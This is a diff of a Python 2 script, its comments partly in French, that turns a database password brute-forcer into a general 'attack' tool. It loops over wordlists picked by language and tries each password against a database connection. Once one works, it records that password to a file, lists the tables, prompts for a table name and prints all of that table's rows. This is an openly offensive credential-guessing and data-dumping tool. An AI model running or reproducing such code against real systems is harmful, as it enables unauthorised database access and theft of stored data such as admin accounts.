@@ -1,5 +1,5 @@
 # -*- coding: utf-8 -*-
-def bruteforce(liste):
+def attack(liste):
     import sys,time
     import os
     import os.path
@@ -27,16 +27,18 @@ def bruteforce(liste):
             database='dbfskkvrlhppgd'
             connectionString = "{}://{}:{}@{}:{}/{}".format(provider,user,password,server,port,database)
             db=create_engine(connectionString)
+            db.connect()
             resultat.write("Mot de passe base---->>>>>>: " + password + "\n")
             print "ok"
             metadata = MetaData(db)
             metadata.reflect(db)
             metadata.tables.keys()
-            admin=Table('admin_user', metadata, autoload=True)
+            print metadata.tables.keys()
+            table = raw_input("Entrer le nom de la table : ")
+            admin=Table(table, metadata, autoload=True)
             sql = admin.select()
             datagrid = sql.execute()
-            print len(datagrid)
-##            table=()
+    ##            table=()
             for row in datagrid:
                 print row
             resultat.close()
@@ -52,56 +54,25 @@ def bruteforce(liste):
 
 
 
-
-##metadata = MetaData(engine)
-##
-##    metadata.reflect(engine)
-##
-##    metadata.tables.keys()
-##
-##    users = Table('database_users', metadata, autoload=True)
-##
-##    s = users.select()
-##
-##    rs = s.execute()
-##    table = ()
-##    for row in rs:
-##        print row‏
-
-
-
-
-
-   
-##    Session = sessionmaker(bind=db)()
-##    session = Session(bind=conn)
-##    query=session.query(admin_user)
-##    print(session)
-    #metadata = MetaData(db)
     
-##    Base = declarative_base(metadata=metadata)
-##    """
-##        J'ai tatonner des tables comme si je les connais pas avant
-##    """
-##
-##    class admin_user(Base):
-##         __tablename__= 'id'
-##         __table_args = {'autoload': True}
-##      
-##    query=session.query(admin_user)
-##    for user in query:
-##        if user.password==password:
-##            resultat.write("Mot de passe---->>>>>>: " + password + "\n")
-##            resultat.close()
-##            print("connection is ok")
-##            break;
-        
 
-if __name__ == "__main__":
-    res = bruteforce(liste ="test.txt")
-    r = open("password.txt", "r")
-    re = r.read()
-    print(re)
-    r.close()
-    while True:
-        w=1
+import argparse
+parser = argparse.ArgumentParser(description='Process a rack...')
+parser.add_argument('lang', metavar='[lang]', type=str, nargs=1, help='type fr for french, en for english and sp for spanish')
+args = parser.parse_args()
+fichier = ''
+if args.lang[0].lower().strip().__eq__('fr'):
+    print 'fr'
+    fichier = "test.txt"
+if args.lang[0].lower().strip().__eq__('en'):
+    print 'fr'
+    fichier = "test1.txt"
+if args.lang[0].lower().strip().__eq__('sp'):
+    print 'fr'
+    fichier = "test2.txt"
+
+res = attack(liste = fichier)
+r = open("password.txt", "r")
+re = r.read()
+print(re)
+r.close()
